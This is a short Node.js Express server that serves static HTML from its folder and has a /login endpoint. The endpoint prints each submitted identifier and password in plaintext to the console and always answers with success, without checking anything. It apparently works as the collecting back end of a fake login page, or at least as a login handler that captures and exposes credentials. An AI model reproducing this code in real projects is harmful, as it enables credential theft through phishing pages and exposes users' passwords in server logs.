const express = require("express");
const path = require("path");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// HTML配信
app.use(express.static(__dirname));


// ログインエンドポイント
app.post("/login", (req, res) => {

  const { identifier, password } = req.body;

  console.log("=== Login Attempt ===");
  console.log("User:", identifier);
  console.log("Password:", password);
  console.log("=====================");

  res.json({
    success: true,
    message: "Received"
  });

});


app.listen(process.env.PORT || 3000, () => {
  console.log("Server running");
});
